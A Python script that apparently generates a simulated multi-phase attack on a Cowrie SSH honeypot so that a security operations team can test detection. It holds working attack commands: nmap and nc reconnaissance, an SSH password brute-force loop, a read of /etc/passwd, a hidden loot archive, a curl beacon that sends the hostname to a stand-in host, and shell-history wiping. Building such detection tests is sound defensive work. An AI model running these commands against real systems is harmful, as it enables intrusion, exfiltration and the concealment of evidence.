#!/usr/bin/env python3
"""
SOC Auto Pentest – Scenario Generator
Génère une attaque complète et corrélable :
Recon → Brute → Access → Discovery → Collection → C2 → Evasion
"""

import subprocess
import logging
import time
import uuid

TARGET = "cowrie"
SSH_PORT = 2222
CAMPAIGN_ID = f"CAMP-{uuid.uuid4().hex[:8]}"

SSH_BASE = (
    "-o StrictHostKeyChecking=no "
    "-o UserKnownHostsFile=/dev/null "
    "-o PreferredAuthentications=password "
    "-o PubkeyAuthentication=no "
    "-o NumberOfPasswordPrompts=1 "
    "-o ConnectTimeout=5"
)

logging.basicConfig(
    filename="logs/pentest.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

def run(cmd, timeout=20):
    logging.info(f"[{CAMPAIGN_ID}] RUN: {cmd}")
    subprocess.run(cmd, shell=True, timeout=timeout,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# -----------------------
# PHASES SOC
# -----------------------

def phase_recon():
    run(f"nmap -sS -p {SSH_PORT} {TARGET}")
    run(f"nc -vz {TARGET} {SSH_PORT}")

def phase_bruteforce():
    users = ["root", "admin", "user"]
    pwds = ["1234", "password", "toor"]
    for u in users:
        for p in pwds:
            run(f"sshpass -p '{p}' ssh {SSH_BASE} -p {SSH_PORT} {u}@{TARGET} echo FAIL")

def ssh_cmd(cmd):
    run(
        f"sshpass -p 'password' ssh -tt {SSH_BASE} "
        f"-p {SSH_PORT} root@{TARGET} "
        f"\"echo [CAMPAIGN:{CAMPAIGN_ID}] {cmd}\""
    )

def phase_discovery():
    cmds = [
        "whoami",
        "id",
        "uname -a",
        "pwd",
        "ls -la",
        "cat /etc/passwd"
    ]
    for c in cmds:
        ssh_cmd(c)
        time.sleep(0.5)

def phase_collection():
    ssh_cmd("tar -czf /tmp/.loot.tgz /etc/hosts")

def phase_c2():
    ssh_cmd("curl http://example.invalid/beacon?id=$(hostname)")

def phase_evasion():
    ssh_cmd("history -c")
    ssh_cmd("rm -f ~/.bash_history")

# -----------------------
# MAIN
# -----------------------

def main():
    logging.info(f"=== START CAMPAIGN {CAMPAIGN_ID} ===")

    phase_recon()
    time.sleep(1)

    phase_bruteforce()
    time.sleep(1)

    phase_discovery()
    phase_collection()
    phase_c2()
    phase_evasion()

    logging.info(f"=== END CAMPAIGN {CAMPAIGN_ID} ===")

if __name__ == "__main__":
    main()

